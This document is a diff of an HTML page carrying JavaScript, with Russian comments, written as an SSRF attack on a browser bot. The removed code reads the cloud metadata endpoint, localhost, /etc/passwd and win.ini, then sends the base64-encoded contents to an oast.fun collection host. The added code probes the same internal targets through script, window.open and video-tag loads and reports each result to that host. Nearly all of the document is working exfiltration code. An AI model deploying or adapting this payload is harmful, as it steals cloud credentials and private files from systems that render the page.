@@ -2,41 +2,37 @@
 <html>
 <body>
     <script>
-        const oast = "http://esqbwjbyepcxrsacleqflghezhfek89a4.oast.fun";
+        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
 
-        async function exfiltrate(url, label) {
-            try {
-                // Пытаемся забрать данные с внутреннего ресурса
-                const response = await fetch(url, {
-                    method: 'GET',
-                    mode: 'no-cors' // Пробуем так, если обычный заблокирует
-                });
-                
-                // Если не удалось прочитать текст напрямую из-за CORS, 
-                // пробуем через стандартный fetch для получения контента
-                const res = await fetch(url);
-                const data = await res.text();
-                
-                // Кодируем в Base64, чтобы спецсимволы не сломали URL
-                const encoded = btoa(unescape(encodeURIComponent(data))).substring(0, 1000); 
-                
-                // Отправляем награбленное на OAST
-                new Image().src = `${oast}/DATA_${label}?content=${encoded}`;
-            } catch (err) {
-                new Image().src = `${oast}/ERROR_${label}?msg=${btoa(err.message)}`;
-            }
+        function log(msg) {
+            new Image().src = oast + "/" + msg + "?r=" + Math.random();
         }
 
-        // 1. Пытаемся достать метаданные (Azure/Google/AWS стиль)
-        // Для Azure часто нужен заголовок Metadata: true, но начнем с простого
-        exfiltrate("http://169.254.169.254/latest/meta-data/", "METADATA_ROOT");
-        
-        // 2. Пытаемся прочитать локальный веб-сервер, который мы нашли на 80 порту
-        exfiltrate("http://127.0.0.1:80/", "LOCAL_HOST_80");
+        // 1. Пытаемся загрузить внутренний ресурс как скрипт.
+        // Если он загрузится, будет ошибка синтаксиса, но мы узнаем, что он доступен!
+        function tryAsScript(url, label) {
+            var s = document.createElement('script');
+            s.src = url;
+            s.onload = () => log("SUCCESS_LOAD_" + label);
+            s.onerror = () => log("TRIGGERED_ERROR_" + label); // Это сработает, если ресурс ответил!
+            document.body.appendChild(s);
+        }
 
-        // 3. Пытаемся прочитать файл через file:// (если бот позволяет)
-        exfiltrate("file:///etc/passwd", "ETC_PASSWD");
-        exfiltrate("file:///C:/Windows/win.ini", "WIN_INI");
+        // 2. Метод через Window.open (иногда боты позволяют это)
+        try {
+            var win = window.open("http://169.254.169.254/latest/meta-data/", "_blank");
+            log("WINDOW_OPEN_ATTEMPT");
+        } catch(e) { log("WINDOW_OPEN_BLOCKED"); }
+
+        // Пробуем основные точки
+        tryAsScript("http://169.254.169.254/latest/meta-data/", "AZURE_AWS_META");
+        tryAsScript("http://127.0.0.1:80/", "LOCAL_SERVER");
+        
+        // 3. Супер-хак: если мы не можем прочитать текст, мы проверим длину ответа через Video/Audio теги
+        var v = document.createElement('video');
+        v.src = "http://169.254.169.254/latest/meta-data/";
+        v.onloadedmetadata = () => log("METADATA_SIZE_LEAK"); 
+        document.body.appendChild(v);
 
     </script>
 </body>
